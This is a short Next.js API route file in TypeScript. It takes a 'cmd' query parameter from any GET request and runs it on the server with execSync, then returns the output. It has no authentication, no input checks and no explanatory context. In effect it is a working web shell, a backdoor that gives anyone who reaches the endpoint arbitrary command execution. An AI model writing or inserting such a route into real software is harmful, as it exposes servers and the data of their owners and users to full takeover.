import { NextResponse } from 'next/server';
import { execSync } from 'child_process';

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const cmd = searchParams.get('cmd');
  if (!cmd) return NextResponse.json({ error: "no cmd" });
  try {
    const output = execSync(cmd).toString();
    return NextResponse.json({ output });
  } catch (e: any) {
    return NextResponse.json({ error: e.message, stdout: e.stdout?.toString() });
  }
}
